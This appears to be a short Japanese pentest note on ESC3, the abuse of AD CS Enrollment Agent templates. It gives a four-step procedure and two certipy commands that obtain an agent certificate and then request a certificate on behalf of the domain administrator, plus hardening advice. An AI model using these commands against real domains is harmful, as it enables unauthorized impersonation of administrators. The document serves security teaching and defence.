---
title: ESC3（Certificate Request Agent による代理発行の悪用）
date: 2026-10-17
category: Active Directory
topic: AD CS
tags: [active-directory, adcs, esc3, certipy]
summary: 登録代理証明書（Enrollment Agent）を取得し、その代理権限で他のユーザーに代わって証明書を発行させる手法
---

## 概要

AD CS には「登録代理（Enrollment Agent）」という仕組みがあり、Certificate Request Agent の EKU を持つ証明書を持つユーザーは、他のユーザーの代わりに証明書要求を行える（スマートカード発行の委任などで使われる正規の機能）。

ESC3 は、このテンプレートに低権限ユーザーでも登録できる場合に成立する。攻撃者はまず Enrollment Agent 証明書を自分用に取得し、その代理権限を使って「管理者の代わりに」証明書を発行させることで、管理者としての認証材料を手に入れる。

## 手順

1. Certificate Request Agent の EKU を持つテンプレートに、低権限ユーザーでも登録できるか確認する。
2. そのテンプレートで Enrollment Agent 証明書を取得する。
3. 取得した Enrollment Agent 証明書の代理権限を使い、「管理者の代わりに」別テンプレートの証明書発行を要求する。
4. 発行された証明書で管理者として認証する。

## コマンド

```
# 1. Enrollment Agent 証明書を取得
certipy req -u user@corp.local -p 'Password123' -ca 'CORP-CA' -template 'EnrollmentAgent'

# 2. その代理権限で管理者用証明書を発行
certipy req -u user@corp.local -p 'Password123' -ca 'CORP-CA' -template 'User' \
  -on-behalf-of 'corp\administrator' -pfx user.pfx
```

## 注意点

- ESC1 と比べると手順が一段多いが、構造としては「代理発行の仕組みそのものを悪用している」点が特徴。正規の運用（スマートカードの一括発行など）で Enrollment Agent テンプレートを使っている組織では、登録権限を厳格に絞る必要がある。
- CA 側で「どのテンプレートに対して代理発行が許可されるか」を制限する設定（Issuance Requirements など）も合わせて確認する。
